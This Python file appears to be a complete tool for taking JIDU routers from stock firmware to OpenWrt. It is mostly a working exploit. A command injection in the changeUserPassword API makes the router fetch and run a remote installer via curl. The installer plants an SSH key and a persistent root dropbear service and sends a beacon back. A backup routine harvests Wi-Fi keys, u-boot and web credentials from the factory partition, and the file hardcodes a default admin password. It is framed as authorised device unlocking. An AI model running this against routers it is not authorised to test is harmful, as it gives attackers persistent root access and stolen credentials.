#!/usr/bin/env python3
"""idu — take a JIDU router from locked-down stock firmware to OpenWrt.

Three capabilities, all driven from the router's own web API and the shell it
hands us:

    detect   identify the model and work out which unlock path applies
    unlock   turn a command injection in the web API into permanent root SSH
    backup   harvest the factory/u-boot credentials and image every partition

The bug
-------
`/WCGI` is a JSON-RPC endpoint. Its `changeUserPassword` handler hashes the new
password by shelling out, roughly:

    printf '%s' "<password>" | openssl dgst -...

`<password>` is interpolated unquoted, so a caller-supplied `$(...)` runs as the
web backend's user — root on the models we tested. The password validator is the
interesting part: it caps length at 32, rejects `|`, but happily passes `$`,
`(`, `)`, `{`, `}` and the whitespace-free `${IFS}`. That rules out a plain
`curl ... | sh`, so this tool ships a script with one payload and runs it with
the next.

Authorised testing only: use this on hardware you own or have written permission
to test. Altering a carrier-supplied unit can break it and may breach your
service terms. Provided as is, without warranty — see the README.
"""

from __future__ import annotations

import argparse
import contextlib
import dataclasses
import http.server
import json
import os
import re
import secrets
import shlex
import shutil
import socket
import socketserver
import string
import subprocess
import sys
import threading
import time
from urllib.parse import urlparse

try:
    import requests
    import urllib3
except ImportError:  # pragma: no cover
    sys.exit("missing dependency: pip install requests")

urllib3.disable_warnings()

# --------------------------------------------------------------------------- #
# constants
# --------------------------------------------------------------------------- #
PASSWORD_MAX = 32
PASSWORD_MIN = 8
BANNED_IN_PASSWORD = "|"
GUEST_USER_TYPE = "2"
STAGING_PATH = "/a"

FACTORY_PASSWORD = "Jiocentrum"

MEDIATEK = {"JIDU6101", "JIDU6201", "JIDU6401", "JIDU6601", "JIDU6701"}
QUALCOMM = {"JIDU6111", "JIDU6411", "JIDU6611", "JIDU6811", "JIDU6911"}


class IduError(RuntimeError):
    """Anything that should stop the run with a readable message."""


# --------------------------------------------------------------------------- #
# the web API
# --------------------------------------------------------------------------- #
@dataclasses.dataclass
class Device:
    model: str
    vendor: str
    board: str
    flags: dict

    @property
    def family(self) -> str:
        if self.model in MEDIATEK:
            return "mediatek"
        if self.model in QUALCOMM:
            return "qualcomm"
        return "unknown"


class Api:
    """JSON-RPC client for /WCGI, with the (fiddly) login dance baked in.

    The sequence the backend insists on: preLogin, login, then postLogin with
    ``Authorization: Bearer <two-part-token>`` — every later call needs the same
    header. Only one admin session may exist at a time, and an activated one
    does not expire quickly, so callers must release it via logout().
    """

    def __init__(self, base: str, timeout: float = 20.0):
        host = urlparse(base).hostname or base
        self.base = base.rstrip("/")
        self.host = host
        self.url = self.base + "/WCGI"
        self.timeout = timeout
        self.http = requests.Session()
        self.http.verify = False
        self.token: str | None = None
        self.device: Device | None = None

    # -- plumbing ---------------------------------------------------------- #
    def call(self, method: str, params: dict | None = None) -> dict:
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        payload = {"id": secrets.token_hex(4), "method": method, "params": params or {}}
        try:
            response = self.http.post(self.url, json=payload, headers=headers,
                                      timeout=self.timeout)
        except requests.exceptions.RequestException as problem:
            raise IduError(
                f"cannot reach the router at {self.base} ({type(problem).__name__}).\n"
                "    Is it powered on, and is this computer on its network?\n"
                "    If it lives at a different address, pass --router URL.") from problem
        try:
            return response.json()
        except ValueError:
            raise IduError(f"{method}: non-JSON reply ({response.text[:120]!r})")

    @staticmethod
    def _ok(reply: dict) -> bool:
        return reply.get("status") == "OK" or str(reply.get("code", "")).startswith("OK_")

    # -- session ----------------------------------------------------------- #
    def connect(self, user: str, password: str, patience: int = 900) -> Device:
        self.call("preLogin")

        deadline = time.time() + patience
        while True:
            reply = self.call("login", {"username": user, "password": password})
            code = reply.get("code")
            if self._ok(reply):
                break
            if code == "ERR_LOGIN_DUPLICATE_ADMIN":
                if time.time() >= deadline:
                    raise IduError(
                        "another admin session is still open. Log out of the web UI "
                        "(or reboot the router) and try again.")
                time.sleep(10)
                continue
            if code == "ERR_LOGIN_CREDENTIALS_FAIL":
                raise IduError("the router rejected those credentials "
                                f"({user}/{password}). Wrong password, or the router "
                                "is not in the expected state.")
            raise IduError(f"login failed: {code} {reply.get('message', '')}")

        results = reply.get("results") or {}
        self.token = results.get("token")
        if not self.token:
            raise IduError("login succeeded but returned no session token")

        flags = results.get("deviceFlags") or {}
        self.device = Device(model=flags.get("DEVICE_MODEL", "unknown"),
                             vendor=flags.get("DEVICE_SYSTEM_NAME", "?"),
                             board=flags.get("BOARD_NAME", "?"),
                             flags=flags)

        post = self.call("postLogin")
        if post.get("code") == "ERR_POSTLOGIN_FACTORY_RESET":
            raise IduError(
                "the router is factory-reset, and its API stays locked until the "
                "setup wizard has been completed.\n"
                "    Open the router web UI in a browser, finish the setup (which "
                "sets the admin password), then run this again with that password.")
        if not self._ok(post):
            raise IduError(f"postLogin failed: {post.get('code')} "
                            f"{post.get('message', '')}")
        return self.device

    def logout(self) -> None:
        if not self.token:
            return
        with contextlib.suppress(Exception):
            self.call("logout")
        self.token = None

    @contextlib.contextmanager
    def session(self, user: str, password: str, patience: int = 900):
        try:
            yield self.connect(user, password, patience)
        finally:
            self.logout()

    # -- user management --------------------------------------------------- #
    def users(self) -> list:
        reply = self.call("getUsers")
        if not self._ok(reply):
            raise IduError(f"getUsers failed: {reply.get('code')}")
        found = reply.get("results") or {}
        if isinstance(found, dict):
            found = found.get("results") or []
        return found if isinstance(found, list) else []

    def guest_record(self) -> dict:
        for record in self.users():
            if str(record.get("userType", "")) == GUEST_USER_TYPE:
                return record
        raise IduError("no guest account (userType=2) present; nothing safe to target")

    def set_password(self, record_id: str, password: str) -> dict:
        # userType 2 keeps the handler off its admin-session-kill branch.
        return self.call("changeUserPassword", {
            "recordId": record_id,
            "password": password,
            "changePassword": "1",
            "userType": GUEST_USER_TYPE,
        })


# --------------------------------------------------------------------------- #
# turning shell into passwords
# --------------------------------------------------------------------------- #
def random_salt() -> str:
    """A 3-char prefix that satisfies the password policy.

    The router refuses the last three passwords used on an account, and a
    download payload always evaluates to its literal prefix, so the prefix has to
    change between runs. Three characters keeps the 32-char budget intact.
    """
    return (secrets.choice(string.ascii_uppercase)
            + secrets.choice(string.ascii_lowercase)
            + secrets.choice(string.digits))


class Injector:
    """Encodes a shell command as a password the firmware will evaluate."""

    def __init__(self, salt: str | None = None):
        self.salt = salt or random_salt()

    def encode(self, command: str) -> str:
        expr = command.replace(" ", "${IFS}")
        password = f"{self.salt}$({expr})"
        if len(password) > PASSWORD_MAX:
            over = len(password) - PASSWORD_MAX
            raise IduError(
                f"payload is {len(password)} chars, {over} over the {PASSWORD_MAX}-char "
                f"budget: {password!r}\n"
                "    Shorten the address (a 13-char IPv4 fits), or give the host a "
                "shorter name.")
        if any(bad in password for bad in BANNED_IN_PASSWORD):
            raise IduError(f"payload contains a character the firmware rejects: {password!r}")
        if len(password) < PASSWORD_MIN:
            raise IduError(f"payload is shorter than the {PASSWORD_MIN}-char minimum")
        return password

    def download(self, address: str, path: str = STAGING_PATH) -> str:
        return self.encode(f"curl {address}>{path}")

    def execute(self, path: str = STAGING_PATH) -> str:
        return self.encode(f"sh {path}")


# --------------------------------------------------------------------------- #
# serving the installer
# --------------------------------------------------------------------------- #
class _Beacon(http.server.BaseHTTPRequestHandler):
    document = b""
    hits: list = []
    logfile: str | None = None

    def _note(self, text: str) -> None:
        _Beacon.hits.append(text)
        if _Beacon.logfile:
            with open(_Beacon.logfile, "a") as handle:
                handle.write(text + "\n")

    def do_GET(self):  # noqa: N802
        self._note(f"GET {self.client_address[0]} {self.path}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(_Beacon.document)))
        self.end_headers()
        self.wfile.write(_Beacon.document)

    def do_POST(self):  # noqa: N802
        size = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(size).decode("utf-8", "replace") if size else ""
        self._note(f"POST {self.client_address[0]} {self.path}\n{body}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):  # keep stderr clean
        pass


class Callback:
    """Tiny HTTP server the router fetches the installer from."""

    def __init__(self, document: str, port: int = 80, logfile: str | None = None):
        _Beacon.document = document.encode()
        _Beacon.hits = []
        _Beacon.logfile = logfile
        # On Windows SO_REUSEADDR also lets a second socket claim a port another
        # process is already serving, which would split the router's requests
        # between us and that process. Bind exclusively there instead.
        socketserver.TCPServer.allow_reuse_address = os.name != "nt"
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", port), _Beacon)
        except OSError as problem:
            if os.name == "nt":
                holder = f"netstat -ano | findstr :{port}"
            else:
                holder = f"lsof -nP -iTCP:{port} -sTCP:LISTEN"
            raise IduError(
                f"cannot listen on port {port}: {problem}\n"
                f"    The router has to fetch the installer from us, so that port must "
                f"be free.\n    Find the holder with:  {holder}"
            ) from problem
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()

    @property
    def hits(self) -> list:
        return _Beacon.hits


def address_reaching(host: str) -> str:
    """The local IPv4 address the router will see us on."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((host, 80))
        return probe.getsockname()[0]
    finally:
        probe.close()


# --------------------------------------------------------------------------- #
# ssh / scp transport
# --------------------------------------------------------------------------- #
def require_tool(name: str) -> None:
    """Fail readably when ssh/scp/ssh-keygen is missing.

    Windows ships the OpenSSH client as an optional feature, so a bare
    ``FileNotFoundError`` from subprocess is the usual first experience there.
    """
    if shutil.which(name) is not None:
        return
    raise IduError(
        f"`{name}` is not installed, or not on PATH.\n"
        "    Windows: install the OpenSSH client once, in an administrator "
        "PowerShell:\n"
        "      Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0\n"
        "    Linux: install the openssh-client package (macOS has it built in).")


def _expect(argv: list, password: str, timeout: int) -> subprocess.CompletedProcess:
    """Run argv under expect, answering a password prompt once."""
    tcl = """
set timeout __T__
spawn {*}$argv
expect {
    -re "(?i)password:"      { send "$env(IDU_PW)\\r"; exp_continue }
    -re "(?i)\\(yes/no\\)"   { send "yes\\r"; exp_continue }
    eof
}
catch wait r
exit [lindex $r 3]
""".replace("__T__", str(timeout))
    env = dict(os.environ, IDU_PW=password or "")
    return subprocess.run(["expect", "-c", tcl] + argv, capture_output=True,
                          text=True, timeout=timeout + 60, env=env)


class Shell:
    """ssh/scp to the router, authenticating by key or by password."""

    def __init__(self, host: str, key: str | None = None, password: str | None = None,
                 user: str = "root"):
        if key is None and password is None:
            raise ValueError("Shell needs a key or a password")
        require_tool("ssh")
        self.host, self.key, self.password = host, key, password
        self.user = user

    # -- option building --------------------------------------------------- #
    def _opts(self) -> list:
        opts = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=10"]
        if self.password is None:
            opts += ["-i", self.key, "-o", "IdentitiesOnly=yes", "-o", "BatchMode=yes"]
        else:
            opts += ["-o", "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1",
                     "-o", "PreferredAuthentications=password"]
        return opts

    def _exec(self, argv: list, timeout: int) -> subprocess.CompletedProcess:
        if self.password is None:
            return subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return _expect(argv, self.password, timeout)

    # -- operations -------------------------------------------------------- #
    def run(self, command: str, timeout: int = 300, check: bool = True) -> str:
        argv = ["ssh"] + self._opts() + [f"{self.user}@{self.host}", command]
        result = self._exec(argv, timeout)
        if check and result.returncode != 0:
            raise IduError(f"remote command failed: {command}\n"
                            f"    {result.stderr.strip()[:200]}")
        return result.stdout

    def send(self, local: str, remote: str, timeout: int = 900) -> None:
        # -O forces the legacy scp protocol, which dropbear speaks.
        require_tool("scp")
        argv = ["scp", "-O"] + self._opts() + [local, f"{self.user}@{self.host}:{remote}"]
        result = self._exec(argv, timeout)
        if result.returncode != 0:
            raise IduError(f"scp failed: {result.stderr.strip()[:200]}")

    def fetch(self, remote: str, local: str, timeout: int = 900) -> None:
        with open(local, "wb") as handle:
            argv = ["ssh"] + self._opts() + [f"{self.user}@{self.host}", f"cat {remote}"]
            proc = subprocess.Popen(argv, stdout=handle, stderr=subprocess.PIPE)
            _, err = proc.communicate(timeout=timeout)
            if proc.returncode != 0:
                raise IduError(f"read {remote} failed: {err.decode().strip()[:200]}")

    def alive(self, timeout: int = 12) -> bool:
        try:
            result = self._exec(["ssh"] + self._opts()
                                + [f"{self.user}@{self.host}", "true"], timeout)
            return result.returncode == 0
        except Exception:  # noqa: BLE001
            return False

    def wait(self, seconds: int, what: str, interval: int = 5) -> None:
        print(f"[*] waiting up to {seconds}s for {what} ...", flush=True)
        for _ in range(max(1, seconds // interval)):
            if self.alive():
                print(f"[+] {what} is reachable")
                return
            time.sleep(interval)
        raise IduError(f"timed out waiting for {what}")


# --------------------------------------------------------------------------- #
# unlock: injection -> root ssh
# --------------------------------------------------------------------------- #
def installer_script(address: str, pubkey: str) -> str:
    """The script the router downloads: installs the key and keeps dropbear alive.

    The vendor's /etc/init.d/dropbear force-disables SSH on every boot of a
    Release build, and this firmware has no /etc/init.d/rc.local, so persistence
    needs an init script of our own ordered after theirs.
    """
    return f"""#!/bin/sh
CB={shlex.quote(address)}
KEY={shlex.quote(pubkey.strip())}
mkdir -p /root/.ssh /etc/dropbear
for f in /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; do
    touch "$f"
    grep -qF "$KEY" "$f" 2>/dev/null || echo "$KEY" >> "$f"
    chmod 600 "$f"
done
chmod 700 /root/.ssh

cat > /etc/init.d/idu-ssh <<'INIT'
#!/bin/sh /etc/rc.common
START=99
STOP=01
start() {{ dropbear -R -p 0.0.0.0:22 >/dev/null 2>&1; return 0; }}
stop()  {{ killall dropbear >/dev/null 2>&1; return 0; }}
reload() {{ start; }}
INIT
chmod +x /etc/init.d/idu-ssh
ln -sf ../init.d/idu-ssh /etc/rc.d/S99idu-ssh
ln -sf ../init.d/idu-ssh /etc/rc.d/K01idu-ssh

dropbear -R -p 0.0.0.0:22 >/dev/null 2>&1
{{
    echo "id: $(id)"
    echo "key: $(wc -l < /root/.ssh/authorized_keys) line(s)"
    echo "persist: $(ls /etc/rc.d/ | tr '\\n' ' ')"
    echo "sshd: $(netstat -lnt 2>/dev/null | grep -c ':22')"
}} | curl -s -X POST --data-binary @- http://$CB/beacon 2>&1
echo installed
"""


class Vector:
    """A way to make the router execute a shell command as root.

    Each vector owns its own constraints and delivery mechanics; `unlock` just
    walks the list until one lands.
    """

    name = "vector"

    def execute(self, api: Api, address: str) -> None:
        raise NotImplementedError


class PasswordVector(Vector):
    """Injection through changeUserPassword — the original bug (<= R2.0.19.5).

    The hashing helper shelled out with the password interpolated, and the
    field validates 8..32 chars while permitting `$`, `(`, `)`, `{`, `}` and
    `${IFS}`. It rejects `|`, so the installer arrives in two steps: fetch it
    into a staging file, then run that file.
    """

    name = "changeUserPassword (password field, ~R2.x)"

    def execute(self, api: Api, address: str) -> None:
        guest = api.guest_record()
        print(f"    targeting guest record {guest.get('recordId')}")
        injector = Injector()
        for label, payload in (("fetch", injector.download(address)),
                               ("run", injector.execute())):
            reply = api.set_password(guest["recordId"], payload)
            if not Api._ok(reply):
                raise IduError(f"{label} payload rejected: {reply.get('code')} "
                                f"{reply.get('message', '')}")
            print(f"    {label} payload accepted ({len(payload)} chars)")
            time.sleep(3)


@dataclasses.dataclass
class Verdict:
    """Assessment of whether a unit can be unlocked, from read-only probes."""

    model: str
    firmware: str
    vectors: list
    evidence: list

    @property
    def unlockable(self) -> bool:
        return bool(self.vectors)


def firmware_version(api: Api) -> str:
    reply = api.call("getFirmwareDetails")
    results = reply.get("results") or {}
    return str(results.get("firmwareVersion") or "")


def _release(version: str) -> tuple | None:
    match = re.search(r"_R(\d+)\.(\d+)", version or "")
    return tuple(int(x) for x in match.groups()) if match else None


def check(api: Api) -> Verdict:
    """Decide whether a unit can be unlocked — WITHOUT changing anything.

    A read-only probe: the firmware release says whether the
    changeUserPassword handler predates the R3.x hardening.
    """
    model = api.device.model if api.device else "?"
    version = firmware_version(api)
    release = _release(version)

    evidence = [f"firmware {version or 'unknown'}"]
    vectors = []

    if release is None:
        evidence.append("unrecognised version string")
    elif release < (3,):
        vectors.append(PasswordVector.name)
        evidence.append("release < R3: changeUserPassword history says injectable")
    else:
        evidence.append("release >= R3: changeUserPassword was hardened")

    return Verdict(model=model, firmware=version, vectors=vectors, evidence=evidence)


def unlock(api: Api, key_path: str, password: str, port: int = 80,
           patience: int = 900) -> None:
    """Exploit the API to install our key and gain root SSH.

    The only vector is the changeUserPassword bug, which R3.x firmware fixed.
    """
    pub_path = key_path + ".pub"
    if not os.path.exists(pub_path):
        raise IduError(f"no public key at {pub_path} — generate one first")
    with open(pub_path) as handle:
        pubkey = handle.read().strip()

    shell = Shell(api.host, key=key_path)
    if shell.alive():
        print("[+] SSH already works")
        return

    address = address_reaching(api.host)
    script = installer_script(address, pubkey)
    vectors: list[Vector] = [PasswordVector()]

    with Callback(script, port=port) as beacon:
        for vector in vectors:
            print(f"[*] trying {vector.name}")
            seen = len(beacon.hits)
            try:
                with api.session("admin", password, patience) as device:
                    print(f"    {device.model} ({device.vendor}, {device.board})")
                    vector.execute(api, address)
            except IduError as problem:
                print(f"[!] {vector.name}: {problem}")
                continue

            try:
                shell.wait(60, "the router")
            except IduError:
                if len(beacon.hits) > seen:
                    raise IduError(
                        "the installer ran but sshd never came up. Last beacon:\n"
                        f"    {beacon.hits[-1].replace(chr(10), chr(10) + '    ')}")
                print(f"[!] {vector.name} never executed (router did not call back)")
                continue

            if len(beacon.hits) > seen:
                print("[+] beacon:")
                print("    " + beacon.hits[-1].replace("\n", "\n    "))
            return

    raise IduError(
        f"{PasswordVector.name} did not land:\n"
        "    Either this unit is newer than R2.0.19.5 (the password handler was\n"
        "    hardened in R3.x) or the API is locked down. The u-boot/UART console\n"
        "    is then the remaining route.")


# --------------------------------------------------------------------------- #
# backup: credentials + partition images
# --------------------------------------------------------------------------- #
@dataclasses.dataclass
class Partition:
    device: str
    size: int
    name: str

    @property
    def filename(self) -> str:
        safe = "".join(c if c.isalnum() or c in "-_." else "_" for c in self.name)
        return f"{self.device}_{safe}.bin"


def parse_mtd(text: str) -> list[Partition]:
    """Parse /proc/mtd, e.g. `mtd7: 00200000 00020000 "MFG"`."""
    found = []
    for line in text.splitlines():
        if ":" not in line:
            continue
        device, rest = line.split(":", 1)
        if not device.startswith("mtd"):
            continue
        fields = rest.split()
        if len(fields) < 2:
            continue
        name = fields[-1].strip('"') if len(fields) >= 3 else fields[1]
        found.append(Partition(device.strip(), int(fields[0], 16), name))
    return found


def read_partitions(shell: Shell) -> list[Partition]:
    return parse_mtd(shell.run("cat /proc/mtd"))


# --------------------------------------------------------------------------- #
# MFG partition: two layouts ship in this family
# --------------------------------------------------------------------------- #
#   Skyworth (JIDU6701)  plain `KEY=VALUE` lines
#   Sercomm  (JIDU6401)  "mfg.data" magic, a u32 slot count, then fixed
#                        32-byte slots starting at 0x40
MFG_SLOT_BYTES = 32
MFG_TABLE_OFFSET = 0x40
MFG_MAX_SLOTS = 128

# names we can assign with confidence in the slot layout
SLOT_MODEL = re.compile(r"^JIDU\d{4}$")
SLOT_SERIAL = re.compile(r"^RS[A-Z0-9]{10,}$")
SLOT_SSID = re.compile(r"^(AirFiber|Jio)[\w.-]*$")


# --------------------------------------------------------------------------- #
#   Telpa  (JIDU6801)   the values are packed with no separators whatsoever, so
#                       they are located by width, anchored on the serial
# --------------------------------------------------------------------------- #
TELPA_SERIAL = re.compile(rb"R[ST][A-Z0-9]{13}")
TELPA_SERIAL_BYTES = 15
TELPA_SSID_BYTES = 15
TELPA_KEY_BYTES = 16


def _telpa_text(blob: bytes, start: int, length: int) -> str:
    chunk = blob[start:start + length]
    text = chunk.decode("latin-1").strip()
    return text if text and all(32 <= ord(c) < 127 for c in text) else ""


def _parse_telpa_record(blob: bytes) -> dict:
    """Telpa packs the record without separators: `G`01234567` then serial, SSID
    and key back to back. Anchoring on the serial (a stable 15-byte shape) rather
    than a fixed offset keeps it correct if the leading field changes length.
    """
    match = TELPA_SERIAL.search(blob)
    if not match:
        return {}
    data = {"sn": match.group().decode()}
    ssid = _telpa_text(blob, match.end(), TELPA_SSID_BYTES)
    if ssid:
        data["WiFi-SSID"] = ssid
        key = _telpa_text(blob, match.end() + TELPA_SSID_BYTES, TELPA_KEY_BYTES)
        if 8 <= len(key) <= 63:
            data["WiFi-Password"] = key
    model = re.search(rb"JIDU\d{4}", blob)
    if model:
        data["device_model"] = model.group().decode()
    return data


def parse_mfg_blob(blob: bytes) -> dict:
    """Parse an MFG partition image in any of the layouts this family ships.

    Unmapped slots are kept as `mfg_slot_N` so nothing is silently dropped —
    the Sercomm table has no field names, so guessing beyond the obvious ones
    would be worse than labelling them by position.
    """
    data: dict = {}
    # The KEY=VALUE text sits inside a larger binary blob, so look for the pairs
    # anywhere rather than anchoring to line starts.
    text = blob.decode("latin-1")
    for match in re.finditer(r"([A-Za-z0-9_.-]{2,40})=([^\x00\r\n]{0,200})", text):
        data.setdefault(match.group(1), match.group(2))
    if "WiFi-SSID" in data or "device_model" in data:
        return {k: v for k, v in data.items() if v}

    if blob[:8] != b"mfg.data":
        return _parse_telpa_record(blob)

    count = int.from_bytes(blob[8:12], "little")
    slots = []
    for index in range(min(count, MFG_MAX_SLOTS)):
        start = MFG_TABLE_OFFSET + index * MFG_SLOT_BYTES
        raw = blob[start:start + MFG_SLOT_BYTES].split(b"\x00", 1)[0]
        if not raw or not raw.strip(b"\xff"):        # empty or erased flash
            slots.append("")
            continue
        value = raw.decode("latin-1").strip()
        slots.append(value if all(32 <= ord(c) < 127 for c in value) else "")

    ssid_index = None
    for index, value in enumerate(slots):
        if not value:
            continue
        if SLOT_MODEL.match(value):
            data["device_model"] = value
        elif SLOT_SERIAL.match(value):
            data.setdefault("sn", value)
        elif SLOT_SSID.match(value) and "WiFi-SSID" not in data:
            data["WiFi-SSID"] = value
            ssid_index = index
        else:
            data[f"mfg_slot_{index}"] = value

    # The Wi-Fi key is the slot immediately after the SSID. Confirmed against a
    # real 6401 — the value it yields is that unit's actual Wi-Fi password — and
    # it mirrors the 6701, where WiFi-SSID and WiFi-Password sit adjacent.
    if ssid_index is not None and ssid_index + 1 < len(slots):
        key = slots[ssid_index + 1]
        if 8 <= len(key) <= 63:
            data["WiFi-Password"] = key
            data.pop(f"mfg_slot_{ssid_index + 1}", None)
    return data


def read_model_and_serial(shell: Shell) -> tuple:
    model = shell.run("cat /tmp/deviceModel 2>/dev/null", check=False).strip()
    serial = shell.run("cat /tmp/deviceSerial 2>/dev/null", check=False).strip()
    return model, serial


NAMED_FACTORY_FIELDS = (
    "WiFi-SSID", "WiFi-Password", "WiFi5-Password", "WiFi5-SSID",
    "uboot_user_name", "uboot_user_password",
    "web_user_name", "web_user_password", "acs_pre_password",
    "sn", "mac", "OUI", "hardware_version", "secure_boot", "factory_mode",
)


def backup(shell: Shell, outdir: str, include_full_chip: bool = False) -> str:
    parts = read_partitions(shell)
    # the partition is "MFG" on Skyworth/Sercomm and "mfg" on Telpa units
    mfg = next((p for p in parts if p.name.lower() == "mfg"), None)
    if mfg is None:
        raise IduError("no MFG partition in /proc/mtd — cannot read the factory block. "
                        "Saw: " + ", ".join(p.name for p in parts))

    os.makedirs(outdir, exist_ok=True)
    # Grab the factory block first: it names the output folder and holds the
    # credentials, and its layout differs by vendor (see parse_mfg_blob).
    staged = os.path.join(outdir, f".{mfg.filename}.part")
    shell.fetch(f"/dev/{mfg.device}", staged)
    with open(staged, "rb") as handle:
        factory = parse_mfg_blob(handle.read())

    model, serial = read_model_and_serial(shell)
    if model:
        factory.setdefault("device_model", model)
    if serial:
        factory.setdefault("sn", serial)

    # fall back to model-serial so a unit we cannot parse is still identifiable
    label = (factory.get("WiFi-SSID")
             or "-".join(x for x in (model, serial) if x)
             or "unknown-ssid")
    root = os.path.join(outdir, label)
    images = os.path.join(root, "backup")
    os.makedirs(images, exist_ok=True)

    slots = sorted(k for k in factory if k.startswith("mfg_slot_"))
    with open(os.path.join(root, "credentials.txt"), "w") as handle:
        handle.write(f"# {factory.get('device_model', '?')} factory data (MFG partition)\n")
        for key in NAMED_FACTORY_FIELDS:
            handle.write(f"{key:20s} = {factory.get(key, '')}\n")
        if slots:
            handle.write("# the vendor table has no field names for these; kept by\n"
                         "# position rather than guessed at\n")
            for key in slots:
                handle.write(f"{key:20s} = {factory.get(key, '')}\n")

    with open(os.path.join(root, "uboot_credentials.env"), "w") as handle:
        handle.write(f"UBOOT_USERNAME={factory.get('uboot_user_name', '')}\n")
        handle.write(f"UBOOT_PASSWORD={factory.get('uboot_user_password', '')}\n")

    with open(os.path.join(root, "partitions.txt"), "w") as handle:
        handle.write(shell.run("cat /proc/mtd"))
    with open(os.path.join(root, "uboot_env.txt"), "w") as handle:
        handle.write("### fw_printenv\n" + shell.run("fw_printenv 2>&1", check=False))
        handle.write("\n### fw_printenv -c /etc/jio.config\n"
                     + shell.run("fw_printenv -c /etc/jio.config 2>&1", check=False))
    with open(os.path.join(root, "factory_env.txt"), "w") as handle:
        handle.write(shell.run("strings /dev/mtd7 2>/dev/null", check=False))
    if slots or not factory.get("WiFi-SSID"):
        print("[!] MFG layout: positional table, not KEY=VALUE — "
              f"named what could be identified, kept {len(slots)} slot(s) as-is")

    print(f"[+] {len(parts)} partitions; writing to {root}")
    for part in parts:
        if part.device == "mtd0" and not include_full_chip:
            print(f"    - {part.device} ({part.name}) skipped, pass --full-chip to include")
            continue
        target = os.path.join(images, part.filename)
        print(f"    - {part.device} {part.name} ({part.size} bytes)")
        if part.device == mfg.device:
            os.replace(staged, target)          # already fetched, just file it
            continue
        shell.fetch(f"/dev/{part.device}", target)
    print(f"[+] backup complete: {root}")
    return root


# --------------------------------------------------------------------------- #
# command line
# --------------------------------------------------------------------------- #
def _default_key() -> str:
    return os.path.expanduser("~/.ssh/idu_rsa")


def _ensure_key(path: str) -> str:
    if os.path.exists(path):
        return path
    require_tool("ssh-keygen")
    print(f"[*] generating an RSA key at {path}")
    subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-N", "", "-C", "idu",
                    "-f", path], check=True, stdout=subprocess.DEVNULL)
    return path


def main(argv: list | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="idu",
        description="Install OpenWrt on a JIDU router (authorised testing only).")
    parser.add_argument("--router", default="https://192.168.31.1")
    parser.add_argument("--password", default=FACTORY_PASSWORD,
                        help=f"router admin password (default {FACTORY_PASSWORD})")
    parser.add_argument("--key", default=_default_key(), help="RSA key for SSH")
    parser.add_argument("--patience", type=int, default=900,
                        help="seconds to wait for a free admin session")
    subs = parser.add_subparsers(dest="command", required=True)
    subs.add_parser("detect", help="identify the model, change nothing")

    check_p = subs.add_parser("check", help="can this unit be unlocked? (read-only)")
    check_p.add_argument("--json", action="store_true", help="machine-readable verdict")

    unlock_p = subs.add_parser("unlock", help="gain root SSH and keep it")
    unlock_p.add_argument("--port", type=int, default=80, help="callback HTTP port")

    backup_p = subs.add_parser("backup", help="credentials + partition images")
    backup_p.add_argument("--outdir", default=".")
    backup_p.add_argument("--full-chip", action="store_true",
                          help="also image mtd0 (the whole SPI chip)")

    args = parser.parse_args(argv)
    api = Api(args.router)

    # One session at a time: the backend permits a single admin login, so this
    # identifies the device and then releases the session before anything that
    # opens one of its own.
    with api.session("admin", args.password, args.patience) as device:
        print(f"[+] {device.model} · {device.vendor} · board {device.board}")
        print(f"[+] family: {device.family}")
        model, family = device.model, device.family
        if args.command == "detect":
            print(f"MODEL={model}")
            print(f"FAMILY={family}")
            return 0

        if args.command == "check":
            verdict = check(api)
            if args.json:
                print(json.dumps({
                    "host": api.host, "model": verdict.model,
                    "firmware": verdict.firmware, "unlockable": verdict.unlockable,
                    "vectors": verdict.vectors, "evidence": verdict.evidence,
                }))
            else:
                state = "YES" if verdict.unlockable else "NO"
                print(f"[+] unlockable: {state}"
                      + (f"  via {', '.join(verdict.vectors)}" if verdict.unlockable else ""))
                for line in verdict.evidence:
                    print(f"    - {line}")
            return 0 if verdict.unlockable else 2

    if args.command == "unlock":
        unlock(api, _ensure_key(args.key), args.password, port=args.port,
               patience=args.patience)
        print(f"[+] try: ssh -i {args.key} -o IdentitiesOnly=yes root@{api.host}")
        return 0

    if args.command == "backup":
        backup(Shell(api.host, key=_ensure_key(args.key)), args.outdir, args.full_chip)
        return 0

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except IduError as problem:
        sys.stderr.write(f"[!] {problem}\n")
        raise SystemExit(1)
